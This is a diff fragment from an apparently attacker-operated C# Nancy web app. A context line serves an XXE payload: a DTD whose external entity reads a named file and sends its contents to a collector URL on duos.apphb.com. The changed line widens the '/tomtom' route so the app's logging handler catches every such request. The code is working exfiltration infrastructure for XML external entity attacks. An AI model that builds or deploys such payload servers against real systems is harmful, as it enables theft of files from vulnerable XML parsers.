@@ -62,7 +62,7 @@ namespace DuosWeb
                 return Response.AsText("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ENTITY % file SYSTEM \"" + path + "\"><!ENTITY % all \"<!ENTITY send SYSTEM 'http://duos.apphb.com/tomtom/add?text=%file;'>\">%all;");
             };
 
-            Get["/tomtom/{any}"] = _ =>
+            Get["/tomtom/{any*}"] = _ =>
             {
                 Data.Add(new RequestEntry()
                 {
